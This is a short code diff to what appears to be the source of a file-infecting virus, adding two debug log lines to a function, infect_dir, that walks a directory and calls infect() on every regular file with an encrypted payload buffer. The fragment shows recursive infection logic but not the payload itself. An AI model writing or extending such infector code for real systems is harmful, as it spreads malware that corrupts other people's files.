@@ -7,6 +7,7 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 	char		p[4096];
 	int		fd;
 
+	debug("infect.dir: ", dirname);
 	if ((fd = ft_open(dirname, 65536, 0)) < 0) return fail("open dir");
 	while (1)
 	{
@@ -30,6 +31,7 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 			}
 			else if (d_isfile(d)){
 				char *t = ft_add_base(dirname, d->d_name);
+				debug("infect.file: ", t);
 				if (t == NULL)
 					continue;
 				infect(t, t, b, bn, crypt_off, crypt_len, opt);
